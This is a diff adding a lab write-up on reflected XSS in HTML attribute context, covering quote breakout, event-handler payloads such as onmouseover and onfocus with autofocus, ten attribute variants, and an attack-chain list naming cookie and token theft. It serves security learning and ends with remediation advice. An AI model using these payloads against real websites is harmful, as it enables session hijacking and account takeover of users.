@@ -5789,3 +5789,487 @@ Ask:
 ```
 Find Allowed → Find Dynamic Feature → Modify Attribute → Trigger
 ```
+
+---
+
+# 🐞 Lab 15 — Reflected XSS in HTML Attribute Context (Angle Brackets Encoded)
+
+---
+
+## 🔹 Overview
+
+Reflected Cross-Site Scripting in attribute context occurs when:
+
+✔ User input is sent to the server  
+✔ The server reflects it inside an HTML attribute  
+✔ The browser interprets injected attributes as executable behavior  
+
+Example:
+
+```
+<input value="USER_INPUT">
+```
+
+---
+
+## ⚠️ Key Restriction
+
+```
+<  >  → encoded ❌
+```
+
+✔ Cannot inject new HTML tags  
+✔ Must stay INSIDE the existing tag  
+
+👉 Core Idea:
+
+We cannot create new elements  
+We must MODIFY the existing element  
+
+---
+
+## 🧠 What Is This Topic?
+
+Context-based XSS where:
+
+👉 Execution depends on WHERE input lands  
+
+---
+
+## 🔄 Flow
+
+1️⃣ User sends input  
+2️⃣ Server reflects inside attribute  
+3️⃣ Browser parses HTML  
+4️⃣ Injected attribute executes  
+
+---
+
+## 🧠 XSS Context (This Lab)
+
+```
+<input value="INPUT">
+```
+
+👉 ATTRIBUTE VALUE CONTEXT  
+
+---
+
+## 🪜 Lab Walkthrough
+
+---
+
+### Step 1 — Open Lab
+
+Locate search functionality  
+
+---
+
+### Step 2 — Test Reflection
+
+```
+test123
+```
+
+✔ Appears on page  
+
+![reflection in attribute](../images/attribute-xss-reflection.png)
+
+---
+
+### Step 3 — Inspect Response (Burp)
+
+```
+<input value="test123">
+```
+
+✔ Confirmed → attribute context  
+
+---
+
+### Step 4 — Try Normal XSS
+
+```
+<script>alert(1)</script>
+```
+
+❌ Fails (angle brackets encoded)  
+
+---
+
+### Step 5 — Break Attribute
+
+```
+"
+```
+
+HTML becomes:
+
+```
+value=""
+```
+
+✔ Attribute escaped  
+
+---
+
+### Step 6 — Inject Event Handler
+
+```
+" onmouseover="alert(1)
+```
+
+---
+
+### Step 7 — Final HTML
+
+```
+<input value="" onmouseover="alert(1)">
+```
+
+---
+
+### Step 8 — Trigger
+
+Move mouse → alert executes 💥  
+
+![attribute xss execution](../images/attribute-xss-final.png)
+
+---
+
+## ✅ Lab Solved
+
+---
+
+## 🧠 Key Learning
+
+When `< >` are blocked → switch to **attribute injection**  
+
+---
+
+## 🧠 Payload Breakdown
+
+---
+
+### Payload
+
+```
+" onmouseover="alert(1)
+```
+
+---
+
+### Step-by-step
+
+---
+
+#### 1️⃣ Close Attribute
+
+```
+"
+```
+
+Closes original attribute  
+
+---
+
+#### 2️⃣ Inject Event
+
+```
+onmouseover=
+```
+
+Creates new attribute  
+
+---
+
+#### 3️⃣ Execution
+
+```
+"alert(1)"
+```
+
+Runs JavaScript  
+
+---
+
+### 🎯 Final Meaning
+
+Close original → inject event → execute JS  
+
+---
+
+## 🔹 Optional Fix (x=")
+
+---
+
+### Payload
+
+```
+" onmouseover="alert(1) x="
+```
+
+---
+
+### Purpose
+
+✔ Fix broken HTML  
+✔ Ensure proper parsing  
+
+---
+
+### Rule
+
+✔ Use only if needed  
+❌ Not mandatory  
+
+---
+
+## 🪜 Execution Flow
+
+1️⃣ Input injected  
+2️⃣ Attribute closed  
+3️⃣ New attribute added  
+4️⃣ Browser parses  
+5️⃣ Event triggered  
+6️⃣ JS executes  
+
+---
+
+## 🌍 Real-World Scenarios (ATTRIBUTE CONTEXT)
+
+---
+
+### 🟢 1️⃣ Input Field Injection
+
+```
+<input value="INPUT">
+```
+
+Payload:
+
+```
+" onfocus="alert(1) autofocus="
+```
+
+✔ Auto-trigger  
+
+---
+
+### 🟢 2️⃣ Placeholder Attribute
+
+```
+<input placeholder="INPUT">
+```
+
+Payload:
+
+```
+" onmouseover="alert(1)
+```
+
+---
+
+### 🟢 3️⃣ Data Attributes
+
+```
+<div data-name="INPUT">
+```
+
+Payload:
+
+```
+" onclick="alert(1)
+```
+
+---
+
+### 🟢 4️⃣ Hidden Fields
+
+```
+<input type="hidden" value="INPUT">
+```
+
+Payload:
+
+```
+" onfocus="alert(1) autofocus="
+```
+
+---
+
+### 🟢 5️⃣ Title Attribute
+
+```
+<div title="INPUT">
+```
+
+Payload:
+
+```
+" onmouseenter="alert(1)
+```
+
+---
+
+### 🟢 6️⃣ Button Injection
+
+```
+<button value="INPUT">
+```
+
+Payload:
+
+```
+" onclick="alert(1)
+```
+
+---
+
+### 🟢 7️⃣ Form Attribute Injection
+
+```
+<form action="INPUT">
+```
+
+Payload:
+
+```
+" onsubmit="alert(1)
+```
+
+---
+
+### 🟢 8️⃣ Image Attributes
+
+```
+<img alt="INPUT">
+```
+
+Payload:
+
+```
+" onerror="alert(1)
+```
+
+---
+
+### 🟢 9️⃣ SVG Attribute Context
+
+```
+<svg width="INPUT">
+```
+
+Payload:
+
+```
+" onload="alert(1)
+```
+
+---
+
+### 🟢 🔟 Link Attributes
+
+```
+<a title="INPUT">
+```
+
+Payload:
+
+```
+" onclick="alert(1)
+```
+
+---
+
+## 🔥 Event Strategy
+
+---
+
+### ✔ Auto-trigger (BEST)
+
+```
+onfocus + autofocus
+onload
+onanimationstart
+```
+
+---
+
+### ✔ User-trigger
+
+```
+onmouseover
+onclick
+onmouseenter
+```
+
+---
+
+### ✔ Input-trigger
+
+```
+oninput
+onchange
+onkeydown
+```
+
+---
+
+## 🔗 Attack Chains
+
+---
+
+### 🔥 Session Theft
+
+```
+document.cookie
+```
+
+---
+
+### 🔥 Token Theft
+
+```
+localStorage.getItem("token")
+```
+
+---
+
+### 🔥 Account Takeover
+
+Modify user actions via JS  
+
+---
+
+### 🔥 Phishing
+
+Inject fake UI  
+
+---
+
+### 🔥 CSRF Bypass
+
+Send requests via JS  
+
+---
+
+## 🛡️ Remediation
+
+Escape attribute values  
+Use proper encoding  
+Avoid dynamic HTML insertion  
+Use CSP  
+
+---
+
+## 🧠 Bug Hunter Mindset
+
+Ask:
+
+👉 Is input inside attribute?  
+👉 Can I break quotes?  
+👉 Can I inject event?  
+👉 Can I auto-trigger?  
+
+---
